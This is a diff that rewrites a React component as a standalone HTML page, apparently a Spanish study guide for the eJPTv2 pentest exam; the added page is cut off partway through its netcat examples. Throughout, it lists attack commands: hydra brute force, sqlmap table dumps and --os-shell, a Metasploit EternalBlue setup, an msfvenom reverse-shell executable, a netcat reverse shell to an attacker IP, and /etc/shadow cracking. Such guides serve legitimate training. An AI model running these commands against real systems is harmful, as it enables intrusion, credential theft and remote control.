@@ -1,529 +1,442 @@
-import React, { useState } from 'react';
-import { ChevronRight, Search, Globe, Server, Database, Terminal, Lock, Shield, Code } from 'lucide-react';
-
-const EjptToolExamples = () => {
-  const [selectedTool, setSelectedTool] = useState(null);
-
-  const tools = {
-    nmap: {
-      title: "Nmap - Escaneo de Red",
-      icon: Search,
-      color: "bg-blue-600",
-      category: "Reconocimiento",
-      examples: [
-        {
-          scenario: "Descubrir hosts activos",
-          command: "nmap -sn 192.168.1.0/24",
-          explanation: "Hace ping sweep sin escaneo de puertos"
-        },
-        {
-          scenario: "Escaneo básico de puertos",
-          command: "nmap -sV -sC -p- 192.168.1.100",
-          explanation: "-sV: versiones | -sC: scripts default | -p-: todos los puertos"
-        },
-        {
-          scenario: "Escaneo rápido top 1000",
-          command: "nmap -T4 -F 192.168.1.100",
-          explanation: "-T4: velocidad agresiva | -F: fast scan"
-        },
-        {
-          scenario: "Escaneo UDP común",
-          command: "nmap -sU --top-ports 100 192.168.1.100",
-          explanation: "Escanea los 100 puertos UDP más comunes"
-        },
-        {
-          scenario: "Detectar SO y traceroute",
-          command: "nmap -A 192.168.1.100",
-          explanation: "Detección agresiva: SO, versión, scripts, traceroute"
-        },
-        {
-          scenario: "Buscar vulnerabilidades",
-          command: "nmap --script vuln 192.168.1.100",
-          explanation: "Ejecuta scripts de detección de vulnerabilidades"
-        }
-      ]
-    },
-    gobuster: {
-      title: "Gobuster - Directory Bruteforce",
-      icon: Globe,
-      color: "bg-green-600",
-      category: "Web",
-      examples: [
-        {
-          scenario: "Buscar directorios comunes",
-          command: "gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt",
-          explanation: "Busca directorios con wordlist común"
-        },
-        {
-          scenario: "Buscar archivos específicos",
-          command: "gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt",
-          explanation: "-x: extensiones a buscar"
-        },
-        {
-          scenario: "Con autenticación básica",
-          command: "gobuster dir -u http://10.10.10.100 -w wordlist.txt -U admin -P password123",
-          explanation: "-U: usuario | -P: password"
-        },
-        {
-          scenario: "Buscar subdominios",
-          command: "gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt",
-          explanation: "Modo DNS para encontrar subdominios"
-        },
-        {
-          scenario: "Ignorar certificados SSL",
-          command: "gobuster dir -u https://10.10.10.100 -w wordlist.txt -k",
-          explanation: "-k: ignora errores de certificado SSL"
-        }
-      ]
-    },
-    hydra: {
-      title: "Hydra - Brute Force",
-      icon: Lock,
-      color: "bg-red-600",
-      category: "Password Attack",
-      examples: [
-        {
-          scenario: "Ataque SSH",
-          command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100",
-          explanation: "-l: usuario fijo | -P: wordlist de passwords"
-        },
-        {
-          scenario: "FTP con lista de usuarios",
-          command: "hydra -L users.txt -P passwords.txt ftp://192.168.1.100",
-          explanation: "-L: lista de usuarios | -P: lista de passwords"
-        },
-        {
-          scenario: "HTTP POST form",
-          command: "hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form '/login.php:username=^USER^&password=^PASS^:F=incorrect'",
-          explanation: "F=incorrect: mensaje de error cuando falla"
-        },
-        {
-          scenario: "HTTP GET form",
-          command: "hydra -L users.txt -P pass.txt 192.168.1.100 http-get-form '/login:user=^USER^&pass=^PASS^:S=Welcome'",
-          explanation: "S=Welcome: mensaje de éxito"
-        },
-        {
-          scenario: "MySQL database",
-          command: "hydra -l root -P passwords.txt mysql://192.168.1.100",
-          explanation: "Ataque a base de datos MySQL"
-        },
-        {
-          scenario: "SMB/Windows shares",
-          command: "hydra -l administrator -P rockyou.txt smb://192.168.1.100",
-          explanation: "Fuerza bruta contra shares SMB"
-        }
-      ]
-    },
-    sqlmap: {
-      title: "SQLMap - SQL Injection",
-      icon: Database,
-      color: "bg-purple-600",
-      category: "Web",
-      examples: [
-        {
-          scenario: "Detectar SQL injection",
-          command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --batch",
-          explanation: "--batch: modo automático sin preguntas"
-        },
-        {
-          scenario: "Listar bases de datos",
-          command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --dbs",
-          explanation: "--dbs: enumera todas las bases de datos"
-        },
-        {
-          scenario: "Listar tablas de una BD",
-          command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' -D database_name --tables",
-          explanation: "-D: selecciona BD | --tables: lista tablas"
-        },
-        {
-          scenario: "Dumpear tabla específica",
-          command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' -D database -T users --dump",
-          explanation: "-T: tabla | --dump: extrae datos"
-        },
-        {
-          scenario: "Con método POST",
-          command: "sqlmap -u 'http://10.10.10.100/login.php' --data='username=admin&password=test' -p username",
-          explanation: "--data: datos POST | -p: parámetro vulnerable"
-        },
-        {
-          scenario: "Obtener shell del servidor",
-          command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --os-shell",
-          explanation: "Intenta obtener una shell interactiva"
-        }
-      ]
-    },
-    metasploit: {
-      title: "Metasploit - Exploitation Framework",
-      icon: Shield,
-      color: "bg-orange-600",
-      category: "Explotación",
-      examples: [
-        {
-          scenario: "Iniciar Metasploit",
-          command: "msfconsole\nsearch eternalblue\nuse exploit/windows/smb/ms17_010_eternalblue",
-          explanation: "Buscar y seleccionar exploit"
-        },
-        {
-          scenario: "Configurar exploit",
-          command: "set RHOSTS 192.168.1.100\nset LHOST 192.168.1.50\nset payload windows/x64/meterpreter/reverse_tcp\nexploit",
-          explanation: "RHOSTS: target | LHOST: tu IP"
-        },
-        {
-          scenario: "Escanear con módulo auxiliar",
-          command: "use auxiliary/scanner/smb/smb_version\nset RHOSTS 192.168.1.0/24\nrun",
-          explanation: "Identifica versión de SMB en la red"
-        },
-        {
-          scenario: "FTP anonymous login",
-          command: "use auxiliary/scanner/ftp/anonymous\nset RHOSTS 192.168.1.100\nrun",
-          explanation: "Verifica acceso anónimo FTP"
-        },
-        {
-          scenario: "Generar payload",
-          command: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe",
-          explanation: "Crea ejecutable malicioso Windows"
-        },
-        {
-          scenario: "Handler para reverse shell",
-          command: "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.50\nexploit",
-          explanation: "Listener para recibir conexiones inversas"
-        }
-      ]
-    },
-    smbclient: {
-      title: "SMBClient / Enum4linux",
-      icon: Server,
-      color: "bg-indigo-600",
-      category: "SMB",
-      examples: [
-        {
-          scenario: "Listar shares disponibles",
-          command: "smbclient -L //192.168.1.100 -N",
-          explanation: "-L: listar | -N: sin password (null session)"
-        },
-        {
-          scenario: "Conectar a share específico",
-          command: "smbclient //192.168.1.100/share_name -U username",
-          explanation: "Conecta con usuario específico"
-        },
-        {
-          scenario: "Conectar como anonymous",
-          command: "smbclient //192.168.1.100/share -U '' -N",
-          explanation: "Usuario vacío y sin password"
-        },
-        {
-          scenario: "Enum4linux completo",
-          command: "enum4linux -a 192.168.1.100",
-          explanation: "-a: todo (users, shares, groups, policies)"
-        },
-        {
-          scenario: "Enum4linux solo usuarios",
-          command: "enum4linux -U 192.168.1.100",
-          explanation: "-U: enumera solo usuarios"
-        },
-        {
-          scenario: "SMBMap para permisos",
-          command: "smbmap -H 192.168.1.100 -u guest",
-          explanation: "Muestra shares y permisos de acceso"
-        },
-        {
-          scenario: "Descargar recursivamente",
-          command: "smbget -R smb://192.168.1.100/share -U username",
-          explanation: "-R: recursivo, descarga todo"
-        }
-      ]
-    },
-    nikto: {
-      title: "Nikto - Web Scanner",
-      icon: Globe,
-      color: "bg-yellow-600",
-      category: "Web",
-      examples: [
-        {
-          scenario: "Escaneo básico",
-          command: "nikto -h http://192.168.1.100",
-          explanation: "-h: host/URL a escanear"
-        },
-        {
-          scenario: "Escaneo en puerto específico",
-          command: "nikto -h 192.168.1.100 -p 8080",
-          explanation: "-p: puerto personalizado"
-        },
-        {
-          scenario: "Con SSL/HTTPS",
-          command: "nikto -h https://192.168.1.100 -ssl",
-          explanation: "-ssl: fuerza conexión SSL"
-        },
-        {
-          scenario: "Guardar resultados",
-          command: "nikto -h http://192.168.1.100 -o results.html -Format html",
-          explanation: "-o: output | -Format: formato de salida"
-        },
-        {
-          scenario: "Con autenticación",
-          command: "nikto -h http://192.168.1.100 -id admin:password",
-          explanation: "-id: credenciales HTTP Basic Auth"
-        }
-      ]
-    },
-    netcat: {
-      title: "Netcat (nc) - Swiss Army Knife",
-      icon: Terminal,
-      color: "bg-gray-600",
-      category: "Networking",
-      examples: [
-        {
-          scenario: "Banner grabbing",
-          command: "nc 192.168.1.100 80",
-          explanation: "Conecta al puerto y muestra banner"
-        },
-        {
-          scenario: "Listener para reverse shell",
-          command: "nc -lvnp 4444",
-          explanation: "-l: listen | -v: verbose | -n: no DNS | -p: puerto"
-        },
-        {
-          scenario: "Transferir archivo",
-          command: "# Receptor:\nnc -lvnp 4444 > file.txt\n# Emisor:\nnc 192.168.1.100 4444 < file.txt",
-          explanation: "Envía archivos entre máquinas"
-        },
-        {
-          scenario: "Reverse shell (víctima)",
-          command: "nc 192.168.1.50 4444 -e /bin/bash",
-          explanation: "-e: ejecuta comando (bash shell)"
-        },
-        {
-          scenario: "Bind shell (atacante)",
-          command: "nc 192.168.1.100 4444",
-          explanation: "Conecta a bind shell en víctima"
-        },
-        {
-          scenario: "Escaneo de puertos simple",
-          command: "nc -zv 192.168.1.100 1-1000",
-          explanation: "-z: zero I/O mode | escanea puertos 1-1000"
-        }
-      ]
-    },
-    johntheripper: {
-      title: "John the Ripper - Password Cracking",
-      icon: Lock,
-      color: "bg-red-700",
-      category: "Password Attack",
-      examples: [
-        {
-          scenario: "Crackear hash básico",
-          command: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
-          explanation: "Usa wordlist para crackear hashes"
-        },
-        {
-          scenario: "Ver passwords crackeadas",
-          command: "john --show hash.txt",
-          explanation: "Muestra passwords ya descubiertas"
-        },
-        {
-          scenario: "Hash de /etc/shadow",
-          command: "unshadow /etc/passwd /etc/shadow > unshadowed.txt\njohn unshadowed.txt",
-          explanation: "Combina passwd y shadow para crackear"
-        },
-        {
-          scenario: "SSH private key",
-          command: "ssh2john id_rsa > ssh_hash.txt\njohn --wordlist=rockyou.txt ssh_hash.txt",
-          explanation: "Convierte llave SSH y crackea passphrase"
-        },
-        {
-          scenario: "ZIP protegido",
-          command: "zip2john file.zip > zip_hash.txt\njohn zip_hash.txt",
-          explanation: "Extrae hash de ZIP y lo crackea"
-        },
-        {
-          scenario: "Formato específico",
-          command: "john --format=NT hash.txt",
-          explanation: "Especifica formato de hash (NT, MD5, SHA, etc)"
-        }
-      ]
-    },
-    searchsploit: {
-      title: "Searchsploit - Exploit Database",
-      icon: Code,
-      color: "bg-pink-600",
-      category: "Explotación",
-      examples: [
-        {
-          scenario: "Buscar exploits por software",
-          command: "searchsploit apache 2.4.49",
-          explanation: "Busca exploits para Apache versión 2.4.49"
-        },
-        {
-          scenario: "Búsqueda exacta",
-          command: "searchsploit -t vsftpd 2.3.4",
-          explanation: "-t: búsqueda por título exacto"
-        },
-        {
-          scenario: "Ver código del exploit",
-          command: "searchsploit -x 49584",
-          explanation: "-x: examina/muestra el código del exploit"
-        },
-        {
-          scenario: "Copiar exploit al directorio",
-          command: "searchsploit -m 49584",
-          explanation: "-m: mirror/copia exploit al directorio actual"
-        },
-        {
-          scenario: "Buscar por plataforma",
-          command: "searchsploit --platform windows kernel",
-          explanation: "Filtra por sistema operativo"
-        },
-        {
-          scenario: "Actualizar base de datos",
-          command: "searchsploit -u",
-          explanation: "Actualiza la base de datos local de exploits"
-        }
-      ]
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>eJPTv2 - Guía de Herramientas (HTML puro)</title>
+  <style>
+    :root{
+      --bg:#0f1720;
+      --card:#0b1220;
+      --muted:#94a3b8;
+      --accent-yellow:#f59e0b;
+      --accent-blue:#60a5fa;
+      --accent-purple:#8b5cf6;
+      --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Courier New", monospace;
     }
-  };
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background: linear-gradient(180deg,#071023 0%, #0b1020 100%);
+      color:#e6eef8;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      padding:24px;
+    }
+    .container{max-width:1100px;margin:0 auto}
+    .header{text-align:center;margin-bottom:28px}
+    .title{
+      font-weight:800;
+      font-size:32px;
+      background: linear-gradient(90deg,var(--accent-blue),var(--accent-purple));
+      -webkit-background-clip:text;background-clip:text;color:transparent;
+      margin:0;
+    }
+    .subtitle{color:var(--muted);margin-top:6px}
 
-  const categories = [...new Set(Object.values(tools).map(t => t.category))];
+    .howto{background:linear-gradient(90deg,#06202f 0%, #0d0730 100%);padding:18px;border-radius:14px;box-shadow:0 10px 30px rgba(2,6,23,.6);margin-bottom:20px}
+    .how-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px}
+    .how-item{background:var(--card);padding:12px;border-radius:10px}
+    .how-item .lead{font-weight:700;color:var(--accent-blue);margin-bottom:6px}
+    .how-item .muted{color:var(--muted);font-size:13px}
 
-  const ToolCard = ({ toolKey, data }) => {
-    const Icon = data.icon;
-    const isSelected = selectedTool === toolKey;
-    
-    return (
-      <div className="mb-4">
-        <button
-          onClick={() => setSelectedTool(isSelected ? null : toolKey)}
-          className={`w-full ${data.color} text-white p-4 rounded-lg shadow-lg hover:opacity-90 transition-all flex items-center justify-between group`}
-        >
-          <div className="flex items-center gap-3">
-            <Icon size={24} />
-            <div className="text-left">
-              <div className="font-bold text-lg">{data.title}</div>
-              <div className="text-xs opacity-80">{data.category}</div>
-            </div>
-          </div>
-          <ChevronRight 
-            size={20} 
-            className={`transform transition-transform ${isSelected ? 'rotate-90' : ''} group-hover:translate-x-1`}
-          />
-        </button>
-        
-        {isSelected && (
-          <div className="mt-3 space-y-3 animate-fadeIn">
-            {data.examples.map((example, idx) => (
-              <div key={idx} className="bg-gray-800 p-4 rounded-lg border-l-4 border-yellow-500 hover:border-yellow-300 transition-colors">
-                <div className="flex items-start gap-2 mb-2">
-                  <div className="bg-yellow-500 text-black text-xs font-bold px-2 py-1 rounded">
-                    {idx + 1}
-                  </div>
-                  <h4 className="font-bold text-yellow-400 flex-1">
-                    {example.scenario}
-                  </h4>
-                </div>
-                
-                <div className="bg-gray-900 p-3 rounded font-mono text-sm text-green-400 mb-2 overflow-x-auto">
-                  {example.command.split('\n').map((line, i) => (
-                    <div key={i} className="whitespace-nowrap">
-                      {line.startsWith('#') ? (
-                        <span className="text-gray-500">{line}</span>
-                      ) : (
-                        <><span className="text-blue-400">$</span> {line}</>
-                      )}
-                    </div>
-                  ))}
-                </div>
-                
-                <div className="text-sm text-gray-300 flex items-start gap-2">
-                  <span className="text-blue-400 shrink-0">💡</span>
-                  <span>{example.explanation}</span>
-                </div>
-              </div>
-            ))}
-          </div>
-        )}
-      </div>
-    );
-  };
+    section.category{margin-bottom:22px}
+    section.category h2{display:flex;align-items:center;gap:10px;font-size:20px;color:#c4b5fd;margin-bottom:10px}
 
-  return (
-    <div className="min-h-screen bg-gray-900 text-white p-6">
-      <div className="max-w-6xl mx-auto">
-        <div className="text-center mb-8">
-          <h1 className="text-4xl font-bold mb-2 text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-600">
-            eJPTv2 - Guía de Herramientas con Ejemplos
-          </h1>
-          <p className="text-gray-400">Casos de uso reales para cada herramienta</p>
+    .tool-card{margin-bottom:12px}
+    .tool-btn{
+      width:100%;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+      padding:12px;
+      border-radius:10px;
+      border:0;
+      cursor:pointer;
+      color:white;
+      box-shadow:0 6px 18px rgba(2,6,23,.6);
+      transition:transform .15s ease,opacity .12s;
+    }
+    .tool-btn:active{transform:translateY(1px)}
+    .tool-left{display:flex;align-items:center;gap:12px}
+    .tool-meta{line-height:1}
+    .tool-title{font-weight:700}
+    .tool-category{font-size:12px;color:rgba(255,255,255,.75)}
+
+    /* tool color variants */
+    .c-blue{background:#2563eb}
+    .c-green{background:#16a34a}
+    .c-red{background:#dc2626}
+    .c-purple{background:#7c3aed}
+    .c-orange{background:#f97316}
+    .c-indigo{background:#4338ca}
+    .c-yellow{background:#f59e0b}
+    .c-gray{background:#374151}
+    .c-reddark{background:#b91c1c}
+    .c-pink{background:#db2777}
+
+    .chev{transition:transform .18s ease;opacity:.95}
+    .chev.rot{transform:rotate(90deg)}
+
+    .examples{
+      margin-top:10px;
+      animation:fadeIn .22s ease;
+      display:grid;
+      gap:10px;
+    }
+    .example{
+      background:#0b1218;padding:12px;border-radius:10px;border-left:4px solid var(--accent-yellow);
+    }
+    .ex-head{display:flex;gap:10px;align-items:flex-start;margin-bottom:8px}
+    .ex-num{background:var(--accent-yellow);color:#071020;padding:4px 8px;border-radius:6px;font-weight:700;font-size:12px}
+    .ex-title{color:#fbbf24;font-weight:700}
+
+    .cmd{
+      background:#06101a;padding:10px;border-radius:8px;font-family:var(--mono);font-size:13px;color:#7ee787;overflow:auto;margin-bottom:8px;border:1px solid rgba(255,255,255,.03)
+    }
+    .cmd .comment{color:#94a3b8}
+    .cmd .prompt{color:#60a5fa;margin-right:6px}
+    .ex-expl{color:var(--muted);font-size:13px;display:flex;gap:8px;align-items:flex-start}
+
+    .pro-tips{margin-top:18px;background:linear-gradient(90deg,#063b2b,#06365a);padding:12px;border-radius:10px}
+    .pro-tips h3{display:flex;gap:8px;align-items:center;margin:0 0 10px 0;color:#f59e0b}
+    .tips-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px}
+    .tip{background:#0b1316;padding:10px;border-radius:8px;color:var(--muted);font-size:13px}
+
+    footer{margin-top:24px;color:var(--muted);font-size:13px;text-align:center}
+
+    @keyframes fadeIn {from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:none}}
+    /* responsive */
+    @media (max-width:520px){
+      .title{font-size:24px}
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header class="header">
+      <h1 class="title">eJPTv2 - Guía de Herramientas con Ejemplos</h1>
+      <p class="subtitle">Casos de uso reales para cada herramienta — archivo HTML independiente</p>
+    </header>
+
+    <div class="howto" aria-hidden="false">
+      <h2 style="color:white;margin:0 0 8px 0;display:flex;align-items:center;gap:8px"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" style="opacity:.95"><path d="M10 3h4v2h-4zM3 8h18v2H3zM7 13h10v2H7zM11 18h2v2h-2z" fill="currentColor"/></svg> Cómo usar esta guía</h2>
+      <div class="how-grid">
+        <div class="how-item">
+          <div class="lead">1️⃣ Selecciona Herramienta</div>
+          <div class="muted">Toca la tarjeta para abrir/cerrar</div>
         </div>
-
-        <div className="mb-8 bg-gradient-to-r from-blue-900 to-purple-900 p-6 rounded-xl shadow-2xl">
-          <h2 className="text-xl font-bold mb-3 flex items-center gap-2">
-            <Search size={24} />
-            Cómo usar esta guía
-          </h2>
-          <div className="grid md:grid-cols-3 gap-4 text-sm">
-            <div className="bg-gray-800 p-3 rounded-lg">
-              <div className="font-bold text-green-400 mb-1">1️⃣ Selecciona Herramienta</div>
-              <div className="text-gray-300">Haz clic en cualquier herramienta</div>
-            </div>
-            <div className="bg-gray-800 p-3 rounded-lg">
-              <div className="font-bold text-yellow-400 mb-1">2️⃣ Ver Ejemplos</div>
-              <div className="text-gray-300">Cada ejemplo muestra un caso específico</div>
-            </div>
-            <div className="bg-gray-800 p-3 rounded-lg">
-              <div className="font-bold text-blue-400 mb-1">3️⃣ Aplicar</div>
-              <div className="text-gray-300">Copia y adapta los comandos</div>
-            </div>
-          </div>
+        <div class="how-item">
+          <div class="lead">2️⃣ Ver Ejemplos</div>
+          <div class="muted">Cada ejemplo muestra comando y explicación</div>
         </div>
-
-        {categories.map(category => (
-          <div key={category} className="mb-8">
-            <h2 className="text-2xl font-bold mb-4 text-purple-400 flex items-center gap-2">
-              <ChevronRight size={24} />
-              {category}
-            </h2>
-            <div className="space-y-3">
-              {Object.entries(tools)
-                .filter(([_, data]) => data.category === category)
-                .map(([key, data]) => (
-                  <ToolCard key={key} toolKey={key} data={data} />
-                ))}
-            </div>
-          </div>
-        ))}
-
-        <div className="mt-8 bg-gradient-to-r from-green-900 to-blue-900 p-6 rounded-xl">
-          <h3 className="font-bold text-yellow-400 mb-3 text-xl flex items-center gap-2">
-            <Shield size={24} />
-            Tips Pro para el Examen
-          </h3>
-          <div className="grid md:grid-cols-2 gap-3 text-sm">
-            <div className="bg-gray-800 p-3 rounded">
-              ✅ Combina herramientas: Nmap → Searchsploit → Metasploit
-            </div>
-            <div className="bg-gray-800 p-3 rounded">
-              ✅ Guarda todos los outputs: -o output.txt
-            </div>
-            <div className="bg-gray-800 p-3 rounded">
-              ✅ Prueba credenciales default: admin:admin, root:root
-            </div>
-            <div className="bg-gray-800 p-3 rounded">
-              ✅ Reutiliza passwords encontradas en todos los servicios
-            </div>
-          </div>
+        <div class="how-item">
+          <div class="lead">3️⃣ Aplicar</div>
+          <div class="muted">Copia y adapta en tu entorno legal</div>
         </div>
       </div>
-
-      <style jsx>{`
-        @keyframes fadeIn {
-          from { opacity: 0; transform: translateY(-10px); }
-          to { opacity: 1; transform: translateY(0); }
-        }
-        .animate-fadeIn {
-          animation: fadeIn 0.3s ease-out;
-        }
-      `}</style>
     </div>
-  );
-};
 
-export default EjptToolExamples;
+    <main id="main"></main>
+
+    <div class="pro-tips">
+      <h3>🛡️ Tips Pro para el examen</h3>
+      <div class="tips-grid">
+        <div class="tip">✅ Combina herramientas: Nmap → Searchsploit → Metasploit</div>
+        <div class="tip">✅ Guarda todos los outputs: -o output.txt</div>
+        <div class="tip">✅ Prueba credenciales default: admin:admin, root:root</div>
+        <div class="tip">✅ Reutiliza passwords encontradas en todos los servicios</div>
+      </div>
+    </div>
+
+    <footer>
+      Archivo HTML autónomo — usa el contenido solo en entornos autorizados.
+    </footer>
+  </div>
+
+  <script>
+    // ======= datos (convertidos de tu objeto React) ========
+    const tools = {
+      nmap: {
+        title: "Nmap - Escaneo de Red",
+        colorClass: "c-blue",
+        category: "Reconocimiento",
+        examples: [
+          { scenario: "Descubrir hosts activos", command: "nmap -sn 192.168.1.0/24", explanation: "Hace ping sweep sin escaneo de puertos" },
+          { scenario: "Escaneo básico de puertos", command: "nmap -sV -sC -p- 192.168.1.100", explanation: "-sV: versiones | -sC: scripts default | -p-: todos los puertos" },
+          { scenario: "Escaneo rápido top 1000", command: "nmap -T4 -F 192.168.1.100", explanation: "-T4: velocidad agresiva | -F: fast scan" },
+          { scenario: "Escaneo UDP común", command: "nmap -sU --top-ports 100 192.168.1.100", explanation: "Escanea los 100 puertos UDP más comunes" },
+          { scenario: "Detectar SO y traceroute", command: "nmap -A 192.168.1.100", explanation: "Detección agresiva: SO, versión, scripts, traceroute" },
+          { scenario: "Buscar vulnerabilidades", command: "nmap --script vuln 192.168.1.100", explanation: "Ejecuta scripts de detección de vulnerabilidades" }
+        ]
+      },
+      gobuster: {
+        title: "Gobuster - Directory Bruteforce",
+        colorClass: "c-green",
+        category: "Web",
+        examples: [
+          { scenario: "Buscar directorios comunes", command: "gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt", explanation: "Busca directorios con wordlist común" },
+          { scenario: "Buscar archivos específicos", command: "gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt", explanation: "-x: extensiones a buscar" },
+          { scenario: "Con autenticación básica", command: "gobuster dir -u http://10.10.10.100 -w wordlist.txt -U admin -P password123", explanation: "-U: usuario | -P: password" },
+          { scenario: "Buscar subdominios", command: "gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt", explanation: "Modo DNS para encontrar subdominios" },
+          { scenario: "Ignorar certificados SSL", command: "gobuster dir -u https://10.10.10.100 -w wordlist.txt -k", explanation: "-k: ignora errores de certificado SSL" }
+        ]
+      },
+      hydra: {
+        title: "Hydra - Brute Force",
+        colorClass: "c-red",
+        category: "Password Attack",
+        examples: [
+          { scenario: "Ataque SSH", command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100", explanation: "-l: usuario fijo | -P: wordlist de passwords" },
+          { scenario: "FTP con lista de usuarios", command: "hydra -L users.txt -P passwords.txt ftp://192.168.1.100", explanation: "-L: lista de usuarios | -P: lista de passwords" },
+          { scenario: "HTTP POST form", command: "hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form '/login.php:username=^USER^&password=^PASS^:F=incorrect'", explanation: "F=incorrect: mensaje de error cuando falla" },
+          { scenario: "HTTP GET form", command: "hydra -L users.txt -P pass.txt 192.168.1.100 http-get-form '/login:user=^USER^&pass=^PASS^:S=Welcome'", explanation: "S=Welcome: mensaje de éxito" },
+          { scenario: "MySQL database", command: "hydra -l root -P passwords.txt mysql://192.168.1.100", explanation: "Ataque a base de datos MySQL" },
+          { scenario: "SMB/Windows shares", command: "hydra -l administrator -P rockyou.txt smb://192.168.1.100", explanation: "Fuerza bruta contra shares SMB" }
+        ]
+      },
+      sqlmap: {
+        title: "SQLMap - SQL Injection",
+        colorClass: "c-purple",
+        category: "Web",
+        examples: [
+          { scenario: "Detectar SQL injection", command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --batch", explanation: "--batch: modo automático sin preguntas" },
+          { scenario: "Listar bases de datos", command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --dbs", explanation: "--dbs: enumera todas las bases de datos" },
+          { scenario: "Listar tablas de una BD", command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' -D database_name --tables", explanation: "-D: selecciona BD | --tables: lista tablas" },
+          { scenario: "Dumpear tabla específica", command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' -D database -T users --dump", explanation: "-T: tabla | --dump: extrae datos" },
+          { scenario: "Con método POST", command: "sqlmap -u 'http://10.10.10.100/login.php' --data='username=admin&password=test' -p username", explanation: "--data: datos POST | -p: parámetro vulnerable" },
+          { scenario: "Obtener shell del servidor", command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --os-shell", explanation: "Intenta obtener una shell interactiva" }
+        ]
+      },
+      metasploit: {
+        title: "Metasploit - Exploitation Framework",
+        colorClass: "c-orange",
+        category: "Explotación",
+        examples: [
+          { scenario: "Iniciar Metasploit", command: "msfconsole\nsearch eternalblue\nuse exploit/windows/smb/ms17_010_eternalblue", explanation: "Buscar y seleccionar exploit" },
+          { scenario: "Configurar exploit", command: "set RHOSTS 192.168.1.100\nset LHOST 192.168.1.50\nset payload windows/x64/meterpreter/reverse_tcp\nexploit", explanation: "RHOSTS: target | LHOST: tu IP" },
+          { scenario: "Escanear con módulo auxiliar", command: "use auxiliary/scanner/smb/smb_version\nset RHOSTS 192.168.1.0/24\nrun", explanation: "Identifica versión de SMB en la red" },
+          { scenario: "FTP anonymous login", command: "use auxiliary/scanner/ftp/anonymous\nset RHOSTS 192.168.1.100\nrun", explanation: "Verifica acceso anónimo FTP" },
+          { scenario: "Generar payload", command: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe", explanation: "Crea ejecutable malicioso Windows" },
+          { scenario: "Handler para reverse shell", command: "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.50\nexploit", explanation: "Listener para recibir conexiones inversas" }
+        ]
+      },
+      smbclient: {
+        title: "SMBClient / Enum4linux",
+        colorClass: "c-indigo",
+        category: "SMB",
+        examples: [
+          { scenario: "Listar shares disponibles", command: "smbclient -L //192.168.1.100 -N", explanation: "-L: listar | -N: sin password (null session)" },
+          { scenario: "Conectar a share específico", command: "smbclient //192.168.1.100/share_name -U username", explanation: "Conecta con usuario específico" },
+          { scenario: "Conectar como anonymous", command: "smbclient //192.168.1.100/share -U '' -N", explanation: "Usuario vacío y sin password" },
+          { scenario: "Enum4linux completo", command: "enum4linux -a 192.168.1.100", explanation: "-a: todo (users, shares, groups, policies)" },
+          { scenario: "Enum4linux solo usuarios", command: "enum4linux -U 192.168.1.100", explanation: "-U: enumera solo usuarios" },
+          { scenario: "SMBMap para permisos", command: "smbmap -H 192.168.1.100 -u guest", explanation: "Muestra shares y permisos de acceso" },
+          { scenario: "Descargar recursivamente", command: "smbget -R smb://192.168.1.100/share -U username", explanation: "-R: recursivo, descarga todo" }
+        ]
+      },
+      nikto: {
+        title: "Nikto - Web Scanner",
+        colorClass: "c-yellow",
+        category: "Web",
+        examples: [
+          { scenario: "Escaneo básico", command: "nikto -h http://192.168.1.100", explanation: "-h: host/URL a escanear" },
+          { scenario: "Escaneo en puerto específico", command: "nikto -h 192.168.1.100 -p 8080", explanation: "-p: puerto personalizado" },
+          { scenario: "Con SSL/HTTPS", command: "nikto -h https://192.168.1.100 -ssl", explanation: "-ssl: fuerza conexión SSL" },
+          { scenario: "Guardar resultados", command: "nikto -h http://192.168.1.100 -o results.html -Format html", explanation: "-o: output | -Format: formato de salida" },
+          { scenario: "Con autenticación", command: "nikto -h http://192.168.1.100 -id admin:password", explanation: "-id: credenciales HTTP Basic Auth" }
+        ]
+      },
+      netcat: {
+        title: "Netcat (nc) - Swiss Army Knife",
+        colorClass: "c-gray",
+        category: "Networking",
+        examples: [
+          { scenario: "Banner grabbing", command: "nc 192.168.1.100 80", explanation: "Conecta al puerto y muestra banner" },
